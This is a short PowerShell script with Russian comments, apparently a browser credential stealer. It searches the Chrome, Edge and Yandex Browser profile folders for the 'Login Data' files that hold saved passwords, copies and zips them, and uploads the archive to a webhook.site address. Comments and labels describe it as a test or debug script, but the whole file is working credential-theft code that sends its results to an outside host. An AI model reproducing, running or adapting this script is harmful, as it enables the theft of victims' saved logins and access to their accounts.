Write-Host "--- СТАРТ СКРИПТА ---" -ForegroundColor Cyan

# 1. Проверка TLS
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Write-Host "[+] TLS 1.2 настроен"
} catch {
    Write-Host "[-] Ошибка TLS: $($_.Exception.Message)"
}

# 2. Твой URL (замени на актуальный!)
$url = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"

# 3. Создание папки
$tmp = "$env:TEMP\debug_p81"
if (Test-Path $tmp) { Remove-Item -Recurse -Force $tmp }
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
Write-Host "[+] Временная папка: $tmp"

# 4. Проверка путей браузеров
$paths = @(
    @{n="CH"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{n="ED"; p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{n="YX"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
)

foreach ($b in $paths) {
    Write-Host "[*] Проверка пути: $($b.p)"
    if (Test-Path $b.p) {
        Write-Host "    [!] ПУТЬ НАЙДЕН!" -ForegroundColor Green
        # Попробуем просто скопировать хоть что-то для теста
        Get-ChildItem -Path $b.p -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
            Write-Host "    [>] Нашел файл: $($_.FullName)"
            Copy-Item $_.FullName -Destination "$tmp\$($b.n)_data" -Force
        }
    } else {
        Write-Host "    [-] Путь не найден" -ForegroundColor Gray
    }
}

# 5. Проверка наличия файлов перед отправкой
$files = Get-ChildItem $tmp
Write-Host "[*] Файлов в папке для отправки: $($files.Count)"

if ($files.Count -gt 0) {
    $z = "$env:TEMP\test_archive.zip"
    Write-Host "[*] Создаю архив..."
    Compress-Archive -Path "$tmp\*" -DestinationPath $z -Force
    Write-Host "[+] Архив готов: $z"

    Write-Host "[*] Пытаюсь отправить на Webhook..."
    try {
        # Самый простой метод отправки для теста
        Invoke-RestMethod -Uri $url -Method Post -InFile $z -ContentType "application/zip"
        Write-Host "[!!!] ОТПРАВЛЕНО УСПЕШНО!" -ForegroundColor Green
    } catch {
        Write-Host "[-] ОШИБКА ПРИ ОТПРАВКЕ: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "[-] НЕЧЕГО ОТПРАВЛЯТЬ. Проверь, установлены ли браузеры." -ForegroundColor Yellow
}

Write-Host "--- КОНЕЦ СКРИПТА ---" -ForegroundColor Cyan
